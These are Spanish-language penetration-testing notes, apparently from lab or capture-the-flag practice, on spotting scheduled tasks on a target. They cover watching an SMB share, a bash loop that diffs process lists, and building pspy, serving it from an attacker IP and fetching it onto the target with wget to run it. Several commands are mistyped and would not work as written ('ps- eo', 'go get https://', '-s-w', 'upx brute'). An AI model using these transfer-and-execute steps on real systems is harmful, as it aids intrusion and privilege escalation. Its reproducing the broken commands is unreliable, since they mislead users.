** Monitorización de tareas en segundo plano ejecutándose a intervalos regulares **
`watch -d "ls /mnt/smbMounted/Users/Public/*; ls /mnt/smbMounted/ZZ_Archive/s4vitar/*"`

==================================================================

** procmon.sh **
``` bash
	
	#!/bin/bash
	
	old_process=$(ps- eo command)
	
	while true; do
		new_process=$(ps- eo command)
		diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
		old_process=$new_process
	done
```
En la variable old_process se almacena la salida de ps -eo command. Lo mismo sucede con new_process.
Las dos variables son comparadas con diff para ver qué procesos han cambiado.
Se representarán con > comandos que aparecen nuevos y con < los que desaparecen.
No mostramos los comandos procmon y command ya que son los utilizados por el script.

==================================================================

** Uso de pspy para la detección de procesos/comandos que se ejecutan a nivel de sistema **
https://github.com/DominicBreuker/pspy

> `cd /opt`
> `go get https://github.com/DominicBreuker/pspy/cmd`
> `GOOS=linux GOARCH=amd64 go build .`
> Reducción del peso del binario:
> `du -hc pspy`
>  `GOOS=linux GOARCH=amd64 go build -ldflags "-s-w" .`
>  `upx brute pspy`
>  Transferir pspy a la máquina objetivo:
>  `python -m SimpleHTTPServer`
>  `wget http://10.10.14.55:8000/pspy`
>  Ejecutar:
>  `chmod +x pspy`
>  `./pspy`

==================================================================

